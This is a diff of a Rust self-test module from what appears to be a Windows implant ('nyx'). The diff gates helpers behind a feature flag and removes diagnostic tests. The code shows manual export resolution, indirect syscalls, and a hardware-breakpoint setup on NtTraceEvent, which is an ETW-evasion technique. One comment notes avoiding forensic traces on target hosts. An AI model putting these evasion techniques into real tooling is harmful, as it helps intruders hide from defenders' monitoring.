@@ -17,11 +17,15 @@
 
 #![cfg(target_os = "windows")]
 
+#[cfg(feature = "selftest")]
 use crate::heap::{String, Vec};
+#[cfg(feature = "selftest")]
 use crate::resolve::export_addr;
+#[cfg(feature = "selftest")]
 use nyx_protocol::Response;
 
 /// Resolve ExitProcess and exit with `code`. Resolved once per call (cheap).
+#[cfg(feature = "selftest")]
 unsafe fn exit(code: u32) -> ! {
     if let Some(addr) = export_addr(b"kernel32.dll", b"ExitProcess") {
         let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
@@ -35,6 +39,7 @@ unsafe fn exit(code: u32) -> ! {
 /// Ensure the indirect-syscall runtime is up (file/token tests need it).
 /// Returns the runtime, or exits the process with 0xFFFFFFFF (a sentinel
 /// distinct from any real bitmask) so a "RT down" failure is unambiguous.
+#[cfg(feature = "selftest")]
 fn ensure_rt() -> Option<&'static crate::syscalls::Runtime> {
     unsafe { crate::syscalls::init_global() };
     match crate::syscalls::global() {
@@ -1497,6 +1502,7 @@ pub unsafe extern "system" fn nyx_selftest_fs_edge() {
 /// no heap). If this returns STATUS_SUCCESS where the heap-buffer version
 /// returned STATUS_NOT_COMMITTED, the bump allocator's slab memory isn't
 /// readable by the kernel.
+#[cfg(feature = "selftest")]
 unsafe fn nt_create_file_stack_path(rt: &crate::syscalls::Runtime) -> i32 {
     // Build "\??\C:\Windows\Temp\nyx_stack_probe.txt" as a fixed stack array.
     // (Use a known-writable path.)
@@ -1601,6 +1607,7 @@ unsafe fn nt_create_file_stack_path(rt: &crate::syscalls::Runtime) -> i32 {
 /// NtCreateFile called via the EXPORT ADDRESS (resolve ntdll!NtCreateFile
 /// directly, no indirect trampoline). Stack path buffer. Decisive test:
 /// succeeds ⇒ indirect jmp is the bug; fails with NOT_COMMITTED ⇒ arg struct.
+#[cfg(feature = "selftest")]
 unsafe fn nt_create_file_via_export_stack() -> i32 {
     let addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtCreateFile") {
         Some(a) => a,
@@ -1908,6 +1915,7 @@ pub unsafe extern "system" fn nyx_selftest_fs_probe() {
 }
 
 /// Write a small marker file via kernel32 WriteFile (the path proven to work).
+#[cfg(feature = "selftest")]
 fn write_marker(name: &str, content: &str) {
     use core::ffi::c_void;
     type CreateFileW = unsafe extern "system" fn(
@@ -1969,6 +1977,7 @@ fn write_marker(name: &str, content: &str) {
 }
 
 /// u32 → decimal String (no format! under no_std).
+#[cfg(feature = "selftest")]
 fn dec_u32(mut v: u32) -> String {
     if v == 0 {
         return String::from("0");
@@ -1988,6 +1997,7 @@ fn dec_u32(mut v: u32) -> String {
 }
 
 /// NTSTATUS → "status=<signed-decimal>\n" (no format! under no_std).
+#[cfg(feature = "selftest")]
 fn format_status(s: i32) -> String {
     let mut out = String::from("status=");
     let mut v = s as u32;
@@ -2016,6 +2026,7 @@ fn format_status(s: i32) -> String {
 
 /// i32 → signed decimal String (no format! under no_std). Negative for NTSTATUS
 /// errors (e.g. STATUS_ACCESS_DENIED = -1073741790).
+#[cfg(feature = "selftest")]
 fn dec_i32(s: i32) -> String {
     let mut out = String::new();
     let mut v = s as u32;
@@ -2041,6 +2052,7 @@ fn dec_i32(s: i32) -> String {
 }
 
 /// u32 → lowercase hex String (no format! under no_std). For NTSTATUS / code.
+#[cfg(feature = "selftest")]
 fn hex_u32(mut v: u32) -> String {
     const HEX: &[u8; 16] = b"0123456789abcdef";
     let mut tmp = [0u8; 8];
@@ -2429,6 +2441,7 @@ pub unsafe extern "system" fn nyx_selftest_transport() {
 // ---- helpers ---------------------------------------------------------------
 
 /// Read an env var (UTF-16) → ASCII-lossy String, or `fallback` if unset.
+#[cfg(feature = "selftest")]
 fn env_var_or(name: &[u8], fallback: &str) -> String {
     type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
     let gev: GetEnvVarW = match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") }
@@ -2457,6 +2470,7 @@ fn env_var_or(name: &[u8], fallback: &str) -> String {
 }
 
 /// Join `base` and `suffix` (suffix is appended verbatim, no separator added).
+#[cfg(feature = "selftest")]
 fn join(base: &str, suffix: &str) -> String {
     let mut s = String::with_capacity(base.len() + suffix.len());
     s.push_str(base);
@@ -2536,6 +2550,7 @@ pub unsafe extern "system" fn nyx_selftest_swap_armed() {
 }
 
 /// Linear sub-slice search (no_std has no `contains` for &[u8] vs &[u8]).
+#[cfg(feature = "selftest")]
 fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
     if needle.is_empty() {
         return true;
@@ -2559,6 +2574,7 @@ fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
 // see exactly where the crash happens even if the process terminates mid-test.
 // ============================================================================
 
+#[cfg(feature = "selftest")]
 #[cfg(nyx_diag)]
 /// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
 /// Uses CreateFileW(APPEND) + WriteFile — no std, no format!.
@@ -2637,127 +2653,10 @@ unsafe fn diag_byte(ch: u8) {
 
 // Production builds ship without --cfg nyx_diag, so diag_byte is a compile-time
 // no-op that leaves no forensic marker file on the target host.
+#[cfg(feature = "selftest")]
 #[cfg(not(nyx_diag))]
 unsafe fn diag_byte(_ch: u8) {
     // no-op: diagnostic markers are disabled in production builds
-}
-
-// ---- Minimal primitive tests (one step at a time) -----------------------
-
-/// Test 1: Can we resolve kernel32!VirtualAlloc + kernel32!VirtualFree and
-/// alloc+free a page?  Exit 0x11 on failure.
-unsafe fn diag_test_resolve_va_vf() {
-    diag_byte(b'a');
-    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else {
-        exit(0x11);
-    };
-    diag_byte(b'b');
-    let Some(vfree) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else {
-        exit(0x11);
-    };
-    diag_byte(b'c');
-    type VAlloc = unsafe extern "system" fn(
-        *mut core::ffi::c_void,
-        usize,
-        u32,
-        u32,
-    ) -> *mut core::ffi::c_void;
-    type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
-    let vaf: VAlloc = core::mem::transmute(vf);
-    let vff: VFree = core::mem::transmute(vfree);
-    let p = vaf(core::ptr::null_mut(), 4096, 0x3000, 0x04);
-    if p.is_null() {
-        exit(0x12);
-    }
-    diag_byte(b'd');
-    vff(p, 0, 0x8000);
-    diag_byte(b'e');
-}
-
-/// Test 2: NtGetContextThread + NtSetContextThread on NT_CURRENT_THREAD with
-/// CONTEXT_DEBUG_REGISTERS.  Exit 0x2x on failure.
-unsafe fn diag_test_ctx_thread() {
-    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
-    let Some(ng) = crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") else {
-        exit(0x21);
-    };
-    diag_byte(b'f');
-    let Some(ns) = crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") else {
-        exit(0x21);
-    };
-    diag_byte(b'g');
-    let ntgct: FnCtx = core::mem::transmute(ng);
-    let ntsct: FnCtx = core::mem::transmute(ns);
-    const NT: usize = 0xFFFF_FFFF_FFFF_FFFE;
-
-    // Allocate ctx buffer.
-    let Some(vf) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc") else {
-        exit(0x21);
-    };
-    let Some(vf2) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree") else {
-        exit(0x21);
-    };
-    type VAlloc = unsafe extern "system" fn(
-        *mut core::ffi::c_void,
-        usize,
-        u32,
-        u32,
-    ) -> *mut core::ffi::c_void;
-    type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
-    let vaf: VAlloc = core::mem::transmute(vf);
-    let vff: VFree = core::mem::transmute(vf2);
-
-    let buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
-    if buf.is_null() {
-        exit(0x22);
-    }
-    diag_byte(b'h');
-    let base = buf as usize;
-    core::ptr::write_bytes(buf as *mut u8, 0, 1232);
-    // ContextFlags = CONTEXT_DEBUG_REGISTERS
-    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
-
-    let st = ntgct(NT, base);
-    if st < 0 {
-        vff(buf, 0, 0x8000);
-        exit(0x23);
-    }
-    diag_byte(b'i');
-
-    // Read DR0 + DR7 to verify.
-    let _dr0 = core::ptr::read_unaligned((base + 0x048) as *const u64);
-    let _dr7 = core::ptr::read_unaligned((base + 0x070) as *const u64);
-    diag_byte(b'j');
-
-    // Set DR0 = some known address, DR7 |= L0.
-    let Some(nt_trace) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") else {
-        vff(buf, 0, 0x8000);
-        exit(0x24);
-    };
-    core::ptr::write_unaligned((base + 0x048) as *mut u64, nt_trace as u64);
-    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
-    core::ptr::write_unaligned(
-        (base + 0x070) as *mut u64,
-        (_dr7 | 1) & !(3u64 << 16) & !(3u64 << 18),
-    );
-    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
-    diag_byte(b'k');
-
-    let st2 = ntsct(NT, base);
-    if st2 < 0 {
-        vff(buf, 0, 0x8000);
-        exit(0x25);
-    }
-    diag_byte(b'l');
-
-    // Restore: clear DR0, DR7.
-    core::ptr::write_unaligned((base + 0x048) as *mut u64, 0u64);
-    core::ptr::write_unaligned((base + 0x068) as *mut u64, 0u64);
-    core::ptr::write_unaligned((base + 0x070) as *mut u64, 0u64);
-    core::ptr::write_unaligned((base + 0x030) as *mut u32, 0x0010_0010);
-    let _ = ntsct(NT, base);
-    vff(buf, 0, 0x8000);
-    diag_byte(b'm');
 }
 
 #[cfg(feature = "selftest")]
